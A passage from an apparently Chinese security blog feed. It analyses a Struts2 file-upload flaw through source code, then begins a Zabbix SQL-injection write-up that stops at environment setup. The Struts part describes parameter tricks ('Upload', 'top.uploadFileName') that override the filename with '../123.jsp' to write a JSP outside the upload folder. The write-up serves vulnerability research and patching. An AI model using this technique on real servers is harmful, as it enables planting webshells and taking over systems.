class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equalsIgnoreCase</span><span class="params">(String anotherString)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span> == anotherString) ? <span class="literal">true</span></span><br><span class="line">            : (anotherString != <span class="literal">null</span>)</span><br><span class="line">            &amp;&amp; (anotherString.value.length == value.length)</span><br><span class="line">            &amp;&amp; regionMatches(<span class="literal">true</span>, <span class="number">0</span>, anotherString, <span class="number">0</span>, value.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">regionMatches</span><span class="params">(<span class="type">boolean</span> ignoreCase, <span class="type">int</span> toffset,</span></span><br><span class="line"><span class="params">        String other, <span class="type">int</span> ooffset, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ta[] = value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> toffset;</span><br><span class="line">    <span class="type">char</span> pa[] = other.value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> ooffset;</span><br><span class="line">    <span class="comment">// Note: toffset, ooffset, or len might be near -1&gt;&gt;&gt;1.</span></span><br><span class="line">    <span class="keyword">if</span> ((ooffset &lt; <span class="number">0</span>) || (toffset &lt; <span class="number">0</span>)</span><br><span class="line">            || (toffset &gt; (<span class="type">long</span>)value.length - len)</span><br><span class="line">            || (ooffset &gt; (<span class="type">long</span>)other.value.length - len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> ta[to++];</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> pa[po++];</span><br><span class="line">        <span class="keyword">if</span> (c1 == c2) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ignoreCase) &#123;</span><br><span class="line">            <span class="comment">// If characters don&#x27;t match but case may be ignored,</span></span><br><span class="line">            <span class="comment">// try converting both characters to uppercase.</span></span><br><span class="line">            <span class="comment">// If the results match, then the comparison scan should</span></span><br><span class="line">            <span class="comment">// continue.</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">u1</span> <span class="operator">=</span> Character.toUpperCase(c1);</span><br><span class="line">            <span class="type">char</span> <span class="variable">u2</span> <span class="operator">=</span> Character.toUpperCase(c2);</span><br><span class="line">            <span class="keyword">if</span> (u1 == u2) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Unfortunately, conversion to uppercase does not work properly</span></span><br><span class="line">            <span class="comment">// for the Georgian alphabet, which has strange rules about case</span></span><br><span class="line">            <span class="comment">// conversion.  So we need to make one last check before</span></span><br><span class="line">            <span class="comment">// exiting.</span></span><br><span class="line">            <span class="keyword">if</span> (Character.toLowerCase(u1) == Character.toLowerCase(u2)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见这里会逐位比较，要满足两个字符，本身相等或同时转大写相等或同时转小写相等就会被认为相等。显然仅仅是利用上面的特性不足以完成这个壮举。</p><p>后面在分析的时候发现，即使存在一个特殊字符恰好能满足苛刻的要求也不能用于payload</p><p>因为在参数被put到<code>acceptableParameters</code>前，会调用<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#isAcceptableParameter</code>进行检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">acceptableName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isIgnoredDMI(name)) &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;DMI is enabled, ignoring DMI method: &#123;&#125;&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">accepted</span> <span class="operator">=</span> <span class="built_in">this</span>.isWithinLengthLimit(name) &amp;&amp; !<span class="built_in">this</span>.isExcluded(name) &amp;&amp; <span class="built_in">this</span>.isAccepted(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.devMode &amp;&amp; accepted) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Parameter [&#123;&#125;] was accepted and will be appended to action!&quot;</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> accepted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>isIgnoredDMI()</code>黑名单检查，正则匹配<code>^(action|method):.*</code>，匹配不到则else逻辑部分</p><p>然后通过黑名单校验和白名单校验（长度校验只会warning，无伤大雅）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">黑名单正则表达式1</span><br><span class="line">(^|\%\&#123;)((#?)(top(\.|\[&#x27;|\[&quot;)|\[\d\]\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\.|\[).*</span><br><span class="line">黑名单正则表达式2</span><br><span class="line">.*(^|\.|\[|\&#x27;|&quot;|get)class(\(\.|\[|\&#x27;|&quot;).*</span><br><span class="line">白名单正则表达式</span><br><span class="line">\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\[&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;])|(\(&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;\)))*</span><br></pre></td></tr></table></figure><p>暂且不说黑名单，白名单校验也无法通过，这里只允许几种样式的参数通过校验，严格限制了字符集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa.aa</span><br><span class="line">aaaa[&#x27;abc&#x27;]</span><br><span class="line">aaaa(&#x27;abc&#x27;)</span><br><span class="line">aaaa[0]</span><br><span class="line">aaaa(0)</span><br></pre></td></tr></table></figure><p>那么只能另寻他路了，回到思考如何在ognl参数绑定时如何进行参数覆盖</p><p><img src="https://s2.loli.net/2024/12/20/HAZ2JKSGzftCy6R.png" alt="img"></p><p>在<code>FileUploadInterceptor#intercept</code>处理后传给<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>进行参数绑定</p><p>跟进<code>newStack.setParameter(name, value.getObject());</code>这段代码可以发现使用了<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>进行实现，而这个方法允许使用OGNL表达式</p><blockquote><p>setParameter</p><p>void setParameter(String expr, Object value)</p><p>Attempts to set a property on a bean in the stack with the given expression using the default search order. N.B.: unlike #setValue(String,Object) it doesn’t allow eval expression.</p><p>Parameters:</p><p>expr - the expression defining the path to the property to be set.</p><p>value - the value to be set into the named property</p></blockquote><p>关于OGNL表达式的基础知识可以参考这篇文章</p><p><a href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p><p>于是可以用OGNL表达式操作一波，看看能否获取到uploadFileName从而实现覆盖</p><p>先说说多文件上传的情况</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadsAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;File&gt; upload;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见这里是List，结合OGNL表达式和白名单校验，很容易联想到使用<code>uplooadFileName[0]</code>就可以获取到第一个文件的文件名</p><p>由S2-066的分析可知，要能在<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>覆盖原始的文件名，则必须要让被覆盖的键值对在TreeMap对象中更靠前，于是这里给upload首字母大写为Upload，然后加上uploadFileName[0]一起传入文件上传接口</p><p>在<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>方法下个断点</p><p><img src="https://s2.loli.net/2024/12/20/4dzWjRoMI2DhaJL.png" alt="img"></p><p>调试这里的代码即可发现，成功由<code>uploadFileName[0]</code>获取到原始文件名<code>1.txt</code>，然后<code>setValue</code>覆盖目标值为<code>../123.jsp</code></p><p>然后聊聊单文件上传的情况，类似地，既然大小写不能解决，就通过OGNL表达式获取</p><p>经过深入的调试可以找到这里OGNL表达式生成语法树后获取相应值的逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getProperty:122, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">getProperty:3344, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:121, ASTProperty (ognl)</span><br><span class="line">evaluateGetValueBody:212, SimpleNode (ognl)</span><br><span class="line">getValue:258, SimpleNode (ognl)</span><br><span class="line">setValueBody:222, ASTChain (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:829, Ognl (ognl)</span><br><span class="line">lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:-1, 1943089905 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$106)</span><br><span class="line">compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Map context, Object target, Object name)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">    <span class="type">CompoundRoot</span> <span class="variable">root</span> <span class="operator">=</span> (CompoundRoot)target;</span><br><span class="line">    <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> (OgnlContext)context;</span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">instanceof</span> Integer) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">index</span> <span class="operator">=</span> (Integer)name;</span><br><span class="line">        <span class="keyword">return</span> root.cutStack(index);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(name <span class="keyword">instanceof</span> String)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;top&quot;</span>.equals(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.size() &gt; <span class="number">0</span> ? root.get(<span class="number">0</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(Object o : root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (OgnlRuntime.hasGetProperty(ognlContext, o, name) || o <span class="keyword">instanceof</span> Map &amp;&amp; ((Map)o).containsKey(name)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> OgnlRuntime.getProperty(ognlContext, o, name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (OgnlException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getReason() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Caught an Ognl exception while getting property &quot;</span> + name;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(msg, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IntrospectionException var11) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context.containsKey(OgnlValueStack.THROW_EXCEPTION_ON_FAILURE)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchPropertyException</span>(target, name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里top会获取root根元素的第一个元素，而此时第一个就是UploadAction对象</p><p><img src="https://s2.loli.net/2024/12/20/QGNUfezOpLoicA7.png" alt="img"></p><p>于是可以用<code>top.uploadFileName</code>这个OGNL表达式获取到原始文件名，并且<code>t</code>在TreeMap对象中可以比<code>U</code>排更后面，从而覆盖原始文件名</p><p><img src="https://s2.loli.net/2024/12/20/XWrVyLpOcU1FPTE.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>和官方漏洞通告所述一致，这里核心思路和S2-066差不多，只是这里通过OGNL表达式获取需要覆盖的对象</p><p>而官方的修复建议如下</p><blockquote><p>Upgrade to Struts 6.4.0 or greater and use Action File Upload Interceptor</p></blockquote><p>修改struts2依赖到<code>6.4.0</code>或更高可以找到这个上传机制的实现逻辑</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> invocation.getInvocationContext().getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (!(invocation.getAction() <span class="keyword">instanceof</span> UploadedFilesAware)) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Action: &#123;&#125; doesn&#x27;t implement: &#123;&#125;, ignoring file upload&quot;</span>, invocation.getProxy().getActionName(), UploadedFilesAware.class.getSimpleName());</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">UploadedFilesAware</span> <span class="variable">action</span> <span class="operator">=</span> (UploadedFilesAware)invocation.getAction();</span><br><span class="line">            <span class="built_in">this</span>.applyValidation(action, multiWrapper);</span><br><span class="line">            Enumeration&lt;String&gt; fileParameterNames = multiWrapper.getFileParameterNames();</span><br><span class="line">            List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">                UploadedFile[] uploadedFiles = multiWrapper.getFiles(inputName);</span><br><span class="line">                <span class="keyword">if</span> (uploadedFiles != <span class="literal">null</span> &amp;&amp; uploadedFiles.length != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(UploadedFile uploadedFile : uploadedFiles) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, uploadedFile, uploadedFile.getOriginalName(), uploadedFile.getContentType(), inputName)) &#123;</span><br><span class="line">                            acceptedFiles.add(uploadedFile);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;No files have been uploaded/accepted&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;Passing: &#123;&#125; uploaded file(s) to action&quot;</span>, acceptedFiles.size());</span><br><span class="line">                action.withUploadedFiles(acceptedFiles);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见这里和原本的逻辑发生了较大变化，只处理了文件上传相关的参数，也就不存在覆盖的问题了</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-42327 Zabbix SQL注入漏洞分析</title>
      <link href="/2024/12/20/CVE-2024-42327%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/20/CVE-2024-42327%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>首发于奇安信攻防社区 <a href="https://forum.butian.net/article/639">https://forum.butian.net/article/639</a></p></blockquote><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Zabbix 是一款开源的网络监控和报警系统，用于监视网络设备、服务器和应用程序的性能和可用性。</p><p>攻击者可以通过API接口，向 user.get API端点发送恶意构造的请求，注入SQL代码，以实现权限提升、数据泄露或系统入侵。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p><img src="https://s2.loli.net/2024/12/20/26EGzIoJ9CemNAZ.png" alt="img"></p><p>6.0.0 &lt;&#x3D; Zabbix &lt;&#x3D; 6.0.31</p><p>6.4.0 &lt;&#x3D; Zabbix &lt;&#x3D; 6.4.16</p><p>Zabbix 7.0.0</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>参考<a href="https://forum.butian.net/share/3056">https://forum.butian.net/share/3056</a></p><p>访问<a href="https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.0/">https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.0/</a></p><p><img src="https://s2.loli.net/2024/12/20/jRrvoJCIAtd16nb.png" alt="img"></p><p>选择 vmx.tar.gz 这个，解压双击.vmx 文件即可导入 vmware workstation</p><p>然后开机即可，访问机器ip 80端口即可看到 zabbix 登录页面，默认账号密码是root&#x2F;zabbix</p><h2 id="php调试环境搭建"><a href="#php调试环境搭建" class="headerlink" title="php调试环境搭建"></a>php调试环境搭建</h2><p>参考<a href="https://juejin.cn/post/7201509055713493049">https://juejin.cn/post/7201509055713493049</a></p><p>我这里源码从 <a href="https://cdn.zabbix.com/zabbix/sources/stable/7.0/">https://cdn.zabbix.com/zabbix/sources/stable/7.0/</a> 下载的</p><p><img src="https://s2.loli.net/2024/12/20/QgklH1JMrYKsX2j.png" alt="img"></p><p>虚拟机中没有php命令，但是有php-fpm命令可以用</p><p><code>php-fpm -i</code>获取到配置信息后使用wizard安装php xdebug拓展，这里安装xdebug-3.4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget https://xdebug.org/files/xdebug-3.4.0.tgz</span><br><span class="line">tar -xvzf xdebug-3.4.0.tgz</span><br><span class="line"><span class="built_in">cd</span> xdebug-3.4.0</span><br><span class="line"><span class="comment"># 编译所需环境</span></span><br><span class="line">yum install -y install gcc automake autoconf libtool make php-devel</span><br><span class="line">phpize</span><br><span class="line">./configue</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> module</span><br><span class="line"><span class="built_in">cp</span> xdebug.so /usr/lib64/php/modules/</span><br></pre></td></tr></table></figure><p>然后<code>vi /etc/php.d/99-xdebug.ini</code> 添加行<code>zend_extension = xdebug</code></p><p>然后<code>systemctl restart php-fpm</code>重启 php-fpm，最后<code>php-fpm -v</code>查看是否成功生效</p><p><img src="https://s2.loli.net/2024/12/20/ksliz1RfDIxGACb.png" alt="img"></p><p>配置php.ini文件，在末尾添加以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xdebug.mode = debug,develop,trace</span><br><span class="line">xdebug.start_with_request = yes</span><br><span class="line">xdebug.client_host = 192.168.182.1</span><br><span class="line">xdebug.client_port = 9003</span><br></pre></td></tr></table></figure><p>具体作用可以参考<a href="https://xdebug.org/docs/develop%EF%BC%8C%E8%BF%99%E9%87%8C%E6%98%AF%E6%8C%87%E5%AE%9Avscode%E6%89%80%E5%9C%A8%E6%9C%BA%E5%AD%90%E7%9A%84ip%E5%92%8C%E9%80%9A%E4%BF%A1%E7%AB%AF%E5%8F%A3%EF%BC%88%E6%B3%A8%E6%84%8F%E8%A6%81%E5%BC%80%E6%94%BE%E8%BF%99%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%89">https://xdebug.org/docs/develop，这里是指定vscode所在机子的ip和通信端口（注意要开放这个端口）</a></p><p>然后在vscode上面添加调试配置，将生成的php xdebug配置的默认配置改为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;远程调试&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;php&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">9003</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;pathMappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;/usr/share/zabbix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/ui&quot;</span></span><br><span class="line">  <span 